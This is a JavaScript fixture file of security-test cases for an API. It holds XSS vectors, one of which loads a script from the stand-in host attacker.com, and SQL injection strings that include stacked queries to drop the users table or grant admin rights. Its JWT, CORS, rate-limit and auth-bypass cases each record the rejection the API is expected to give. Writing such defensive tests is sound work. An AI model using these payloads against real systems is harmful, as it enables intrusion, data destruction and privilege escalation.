/**
 * Security Test Data Fixtures
 * Contains payloads and test cases for security testing (Phase 4)
 *
 * Categories:
 * - XSS Injection Payloads
 * - SQL Injection Patterns
 * - JWT Manipulation
 * - CORS Scenarios
 * - Rate Limit Test Cases
 * - Authentication Bypass Attempts
 */

const { PAYLOAD_SIZES } = require('./testConstants');

// ============================================================================
// XSS INJECTION PAYLOADS (20+ variations)
// ============================================================================

const XSS_PAYLOADS = {
  // Script tags
  basicScript: '<script>alert(1)</script>',
  scriptWithSrc: '<script src="http://attacker.com/malicious.js"></script>',
  nestedScript: '<script><script>alert(1)</script></script>',
  scriptUsingEval: '<script>eval("alert(1)")</script>',
  scriptWithNewFunction: '<script>new Function("alert(1)")()</script>',

  // Event handlers
  imgOnerror: '<img src=x onerror=alert(1)>',
  imgOnload: '<img src="x" onload="alert(1)">',
  svgOnload: '<svg onload=alert(1)>',
  svgOnerror: '<svg onerror=alert(1)>',
  bodyOnload: '<body onload=alert(1)>',
  divOnmouseover: '<div onmouseover=alert(1)>test</div>',
  inputOnfocus: '<input onfocus=alert(1) autofocus>',
  iframeOnload: '<iframe onload=alert(1)></iframe>',

  // Encoded payloads
  urlEncoded: '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
  doubleUrlEncoded: '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
  htmlEncoded: '&lt;script&gt;alert(1)&lt;/script&gt;',
  unicodeEscaped: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
  hexEncoded: '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',

  // CSS/SVG vectors
  styleTag: '<style>*{background:url("javascript:alert(1)")}</style>',
  cssImport: '@import url("javascript:alert(1)");',
  svgPath: '<svg><path d="M0,0" stroke="url(javascript:alert(1))" /></svg>',

  // Data URIs
  dataUri: '<img src="data:text/html,<script>alert(1)</script>">',
  javascriptUri: '<a href="javascript:alert(1)">Click</a>',

  // Mutation XSS (mXSS)
  mutationXSS: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',

  // Long payload (boundary testing)
  longPayloadScript: '<script>' + 'alert(1);'.repeat(PAYLOAD_SIZES.XSS_PAYLOAD_REPEAT) + '</script>',
  longPayloadImg: '<img src=x onerror="' + 'alert(1);'.repeat(PAYLOAD_SIZES.XSS_PAYLOAD_SHORT) + '">',
};

// ============================================================================
// SQL INJECTION PATTERNS (15+ variations)
// ============================================================================

const SQL_INJECTION_PAYLOADS = {
  // Basic SQL injection
  basicOr: "' OR '1'='1",
  basicOrTrue: "' OR 1=1--",
  basicOrComment: "' OR 1=1 /*",
  basicUnion: "' UNION SELECT NULL--",
  basicUnionMultiple: "' UNION SELECT NULL, NULL, NULL--",

  // Time-based blind
  timeBasedWaitfor: "'; WAITFOR DELAY '00:00:05'--",
  timeBasedSleep: "'; SELECT SLEEP(5)--",
  timeBasedBenchmark: "'; SELECT BENCHMARK(1000000,MD5('test'))--",

  // Stacked queries
  stackedInsert: "'; INSERT INTO users (id, name) VALUES (999, 'hacker')--",
  stackedDrop: "'; DROP TABLE users--",
  stackedUpdate: "'; UPDATE users SET admin=1--",

  // Boolean-based blind
  booleanBased: "' AND 1=1--",
  booleanCompare: "' AND '1'='1",
  booleanSubstring: "' AND SUBSTRING(version(),1,1)='5'--",

  // No-space variants (WAF bypass)
  noSpace1: "'OR'1'='1",
  noSpace2: "'/**/OR/**/1=1--",
};

// ============================================================================
// JWT MANIPULATION PAYLOADS (10+ variations)
// ============================================================================

const JWT_PAYLOADS = {
  // Algorithm tampering
  noneAlgorithm: {
    header: { alg: 'none', typ: 'JWT' },
    payload: { user: 'admin', iat: 1234567, exp: 9999999 },
    expectedBehavior: 'should reject alg:none'
  },

  hs256ToRs256: {
    description: 'Switch from HS256 (symmetric) to RS256 (asymmetric)',
    expectedBehavior: 'should reject key confusion attack'
  },

  // Payload tampering
  tamperedPayload: {
    original: 'header.payload.signature',
    tampered: 'header.tamperedPayload.signature',
    expectedBehavior: 'should reject invalid signature'
  },

  expiredToken: {
    payload: { user: 'qa', iat: 1609459200, exp: 1609462800 }, // Expired in 2021
    expectedBehavior: 'should reject expired token'
  },

  futureToken: {
    payload: { user: 'qa', iat: 9999999999, exp: 9999999999 },
    expectedBehavior: 'should reject nbf (not before) claim'
  },

  missingRequiredClaims: {
    payload: { user: 'qa' }, // Missing iat, exp
    expectedBehavior: 'should reject missing claims'
  },

  invalidClaimTypes: {
    payload: { user: 123, iat: 'not-a-number', exp: 'also-not-a-number' },
    expectedBehavior: 'should reject invalid claim types'
  },

  malformedToken: {
    token: 'only.two.parts',
    expectedBehavior: 'should reject malformed token'
  },

  emptyToken: {
    token: '',
    expectedBehavior: 'should reject empty token'
  },

  signatureOnly: {
    token: '.signature',
    expectedBehavior: 'should reject invalid format'
  },
};

// ============================================================================
// CORS SCENARIOS (8+ test cases)
// ============================================================================

const CORS_SCENARIOS = {
  // Valid CORS requests
  validOriginFromWhitelist: {
    origin: 'http://localhost:3000',
    expectedHeader: 'http://localhost:3000',
    shouldAllow: true
  },

  // Invalid origins
  randomOrigin: {
    origin: 'http://attacker.com',
    expectedHeader: undefined,
    shouldAllow: false
  },

  nullOrigin: {
    origin: 'null',
    expectedHeader: undefined,
    shouldAllow: false
  },

  // Missing origin
  noOriginHeader: {
    origin: undefined,
    expectedBehavior: 'request should still work (no CORS header needed)'
  },

  // Credential requests
  credentialRequest: {
    origin: 'http://localhost:3000',
    credentials: 'include',
    expectedAllowCredentials: true
  },

  // Preflight requests
  preflightOptions: {
    method: 'OPTIONS',
    headers: {
      'Access-Control-Request-Method': 'POST',
      'Access-Control-Request-Headers': 'Content-Type'
    },
    expectedHeaders: ['Access-Control-Allow-Methods', 'Access-Control-Allow-Headers']
  },

  // Methods validation
  nonStandardMethod: {
    method: 'PATCH',
    origin: 'http://localhost:3000',
    expectedBehavior: 'should validate allowed methods'
  },

  // Headers validation
  forbiddenHeader: {
    headers: { 'Authorization': 'Bearer token' },
    origin: 'http://attacker.com',
    expectedBehavior: 'should not allow forbidden headers from invalid origin'
  },
};

// ============================================================================
// RATE LIMIT TEST CASES (5+ patterns)
// ============================================================================

const RATE_LIMIT_TESTS = {
  // Normal operation
  withinLimit: {
    requests: 50,
    window: 60000, // 1 minute
    limit: 100,
    expectedStatus: 200,
    description: 'Should allow requests within rate limit'
  },

  // Exceed limit
  exceedLimit: {
    requests: 150,
    window: 60000,
    limit: 100,
    expectedStatus: 429,
    description: 'Should reject when limit exceeded'
  },

  // Burst attack
  burstAttack: {
    requests: 100,
    interval: 100, // 100ms between requests = 1s total
    limit: 100,
    window: 60000,
    expectedBehavior: 'Should handle rapid-fire requests'
  },

  // Window reset
  windowReset: {
    firstBatch: 100,
    window: 1000, // 1 second window
    waitBetweenBatches: 1500,
    secondBatch: 100,
    expectedBehavior: 'Should allow new batch after window expires'
  },

  // Distributed attack
  distributedAttack: {
    ips: ['192.168.1.1', '192.168.1.2', '192.168.1.3'],
    requestsPerIp: 50,
    limitPerIp: 100,
    expectedBehavior: 'Should rate limit per IP if applicable'
  },
};

// ============================================================================
// AUTHENTICATION BYPASS ATTEMPTS (8+ variations)
// ============================================================================

const AUTH_BYPASS_ATTEMPTS = {
  // Missing auth
  noAuthHeader: {
    headers: {},
    expectedStatus: 401,
    description: 'Missing Authorization header'
  },

  // Invalid auth schemes
  basicAuth: {
    headers: { 'Authorization': 'Basic dXNlcjpwYXNz' },
    expectedStatus: 401,
    description: 'Basic auth instead of Bearer'
  },

  invalidScheme: {
    headers: { 'Authorization': 'CustomScheme token' },
    expectedStatus: 401,
    description: 'Unknown auth scheme'
  },

  // Case sensitivity
  lowercaseBearer: {
    headers: { 'Authorization': 'bearer valid.jwt.token' },
    expectedBehavior: 'Check if case-sensitive'
  },

  // Token variations
  emptyToken: {
    headers: { 'Authorization': 'Bearer ' },
    expectedStatus: 401,
    description: 'Empty bearer token'
  },

  malformedToken: {
    headers: { 'Authorization': 'Bearer invalid_token' },
    expectedStatus: 401,
    description: 'Non-JWT bearer token'
  },

  // Null/undefined tricks
  nullToken: {
    headers: { 'Authorization': 'Bearer null' },
    expectedStatus: 401,
    description: 'Literal "null" token'
  },

  undefinedToken: {
    headers: { 'Authorization': 'Bearer undefined' },
    expectedStatus: 401,
    description: 'Literal "undefined" token'
  },
};

// ============================================================================
// PAYLOAD SIZE LIMITS (for boundary testing)
// ============================================================================

const PAYLOAD_SIZE_TESTS = {
  empty: {
    message: '',
    expectedStatus: 400,
    description: 'Empty message'
  },

  withinLimit: {
    message: 'x'.repeat(PAYLOAD_SIZES.MAX_MESSAGE),
    expectedStatus: 202,
    description: 'Exactly at limit (500 chars)'
  },

  justOverLimit: {
    message: 'x'.repeat(PAYLOAD_SIZES.LARGE_MESSAGE),
    expectedStatus: 202, // Accepted but will fail processing
    processingStatus: 'FAILED',
    processingReason: 'Payload too large',
    description: 'Just over limit (501 chars)'
  },

  largePayload: {
    message: 'x'.repeat(PAYLOAD_SIZES.VERY_LARGE),
    expectedStatus: 202,
    processingStatus: 'FAILED',
    processingReason: 'Payload too large',
    description: 'Large payload (10k chars)'
  },

  veryLargePayload: {
    message: 'x'.repeat(PAYLOAD_SIZES.EXTREME_PAYLOAD),
    expectedStatus: 413, // Payload too large at HTTP level
    description: 'Very large payload (1M chars) - may hit HTTP limits'
  },
};

// ============================================================================
// OWASP TOP 10 Mapping
// ============================================================================

const OWASP_MAPPING = {
  'A01:2021 - Broken Access Control': [
    'Missing auth header',
    'Invalid token',
    'Expired token',
    'CORS bypass attempts'
  ],
  'A02:2021 - Cryptographic Failures': [
    'Weak JWT algorithms',
    'Signature tampering',
    'Algorithm confusion'
  ],
  'A03:2021 - Injection': [
    'XSS payloads',
    'SQL injection patterns',
    'Command injection'
  ],
  'A04:2021 - Insecure Design': [
    'Rate limit bypass',
    'Authentication bypass'
  ],
  'A05:2021 - Security Misconfiguration': [
    'CORS misconfiguration',
    'Missing security headers'
  ],
  'A06:2021 - Vulnerable Components': [
    'Dependency vulnerabilities (not tested here)'
  ],
  'A07:2021 - Authentication Failures': [
    'JWT expiration handling',
    'Token refresh logic'
  ],
  'A08:2021 - Software Data Integrity Failures': [
    'Unsigned tokens',
    'Tampered payloads'
  ],
  'A09:2021 - Logging & Monitoring Failures': [
    'Missing security event logging'
  ],
  'A10:2021 - SSRF': [
    'Not applicable to this API'
  ]
};

module.exports = {
  XSS_PAYLOADS,
  SQL_INJECTION_PAYLOADS,
  JWT_PAYLOADS,
  CORS_SCENARIOS,
  RATE_LIMIT_TESTS,
  AUTH_BYPASS_ATTEMPTS,
  PAYLOAD_SIZE_TESTS,
  OWASP_MAPPING
};
